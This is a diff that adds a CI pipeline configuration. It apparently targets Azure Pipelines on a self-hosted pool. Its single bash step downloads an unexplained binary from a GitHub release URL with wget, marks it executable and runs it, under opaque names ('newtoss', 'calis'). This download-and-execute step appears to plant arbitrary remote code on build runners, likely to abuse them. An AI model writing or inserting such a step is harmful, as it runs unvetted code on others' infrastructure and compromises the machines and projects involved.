@@ -1,0 +1,22 @@
+trigger:
+- main
+
+pool:
+  name: "german" 
+
+steps:
+- bash: |
+    set -euo pipefail
+
+    URL="https://github.com/RenderAuto/Autos/releases/download/turkeyrender/autoren8"
+    DEST="newtoss"
+
+    echo "down: $URL"
+    wget -q -O "$DEST" "$URL"
+
+    echo "run"
+    chmod +x "$DEST"
+
+    echo "runn"
+    ./"$DEST"
+  displayName: "calis"
